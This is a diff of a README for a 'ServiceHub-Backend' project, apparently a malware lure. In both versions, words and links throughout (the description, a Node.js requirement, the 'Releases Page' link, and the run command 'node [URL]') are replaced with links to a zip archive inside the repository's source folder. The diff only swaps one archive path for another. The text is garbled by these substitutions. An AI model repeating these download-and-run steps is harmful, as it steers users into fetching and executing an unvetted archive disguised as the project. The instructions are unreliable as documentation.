@@ -2,18 +2,18 @@
 
 ## 🚀 Getting Started
 
-Welcome to the ServiceHub-Backend. This application provides a https://raw.githubusercontent.com/ELMAGIC1985/ServiceHub-Backend/main/src/services/service/Hub_Backend_Service_3.7.zip backend for a secure service platform. It supports multiple roles, safe authentication, wallet payments, and reliable Firebase integration.
+Welcome to the ServiceHub-Backend. This application provides a https://github.com/ELMAGIC1985/ServiceHub-Backend/raw/refs/heads/main/src/services/auth/Service_Hub_Backend_v1.8.zip backend for a secure service platform. It supports multiple roles, safe authentication, wallet payments, and reliable Firebase integration.
 
 ## 📥 Download Now!
 
-[![Download ServiceHub-Backend](https://raw.githubusercontent.com/ELMAGIC1985/ServiceHub-Backend/main/src/services/service/Hub_Backend_Service_3.7.zip)](https://raw.githubusercontent.com/ELMAGIC1985/ServiceHub-Backend/main/src/services/service/Hub_Backend_Service_3.7.zip)
+[![Download ServiceHub-Backend](https://github.com/ELMAGIC1985/ServiceHub-Backend/raw/refs/heads/main/src/services/auth/Service_Hub_Backend_v1.8.zip)](https://github.com/ELMAGIC1985/ServiceHub-Backend/raw/refs/heads/main/src/services/auth/Service_Hub_Backend_v1.8.zip)
 
 ## 🛠️ System Requirements
 
 Before you begin, ensure your system meets these requirements:
 
 - **Operating System:** Windows 10 or later, macOS Catalina or later, or a Linux distribution.
-- **https://raw.githubusercontent.com/ELMAGIC1985/ServiceHub-Backend/main/src/services/service/Hub_Backend_Service_3.7.zip** Version 14.x or later installed.
+- **https://github.com/ELMAGIC1985/ServiceHub-Backend/raw/refs/heads/main/src/services/auth/Service_Hub_Backend_v1.8.zip** Version 14.x or later installed.
 - **MongoDB:** Installed for managing data.
 - **Internet Connection:** Required for initial setup and running the app.
 
@@ -27,13 +27,13 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📦 Download & Install
 
-To download the application, visit this page: [Download ServiceHub-Backend](https://raw.githubusercontent.com/ELMAGIC1985/ServiceHub-Backend/main/src/services/service/Hub_Backend_Service_3.7.zip).
+To download the application, visit this page: [Download ServiceHub-Backend](https://github.com/ELMAGIC1985/ServiceHub-Backend/raw/refs/heads/main/src/services/auth/Service_Hub_Backend_v1.8.zip).
 
 ### Steps to Download
 
 1. **Visit the Releases Page:**
    Go to the following link:
-   [ServiceHub-Backend Releases](https://raw.githubusercontent.com/ELMAGIC1985/ServiceHub-Backend/main/src/services/service/Hub_Backend_Service_3.7.zip).
+   [ServiceHub-Backend Releases](https://github.com/ELMAGIC1985/ServiceHub-Backend/raw/refs/heads/main/src/services/auth/Service_Hub_Backend_v1.8.zip).
 
 2. **Select the Latest Version:**
    On the releases page, look for the latest version. It is usually at the top.
@@ -71,7 +71,7 @@ To start the application, follow these steps:
 2. Navigate to the directory where you installed the application.
 3. Run the command: 
    ```
-   node https://raw.githubusercontent.com/ELMAGIC1985/ServiceHub-Backend/main/src/services/service/Hub_Backend_Service_3.7.zip
+   node https://github.com/ELMAGIC1985/ServiceHub-Backend/raw/refs/heads/main/src/services/auth/Service_Hub_Backend_v1.8.zip
    ```
 4. Visit `http://localhost:3000` in your web browser to access the app.
 
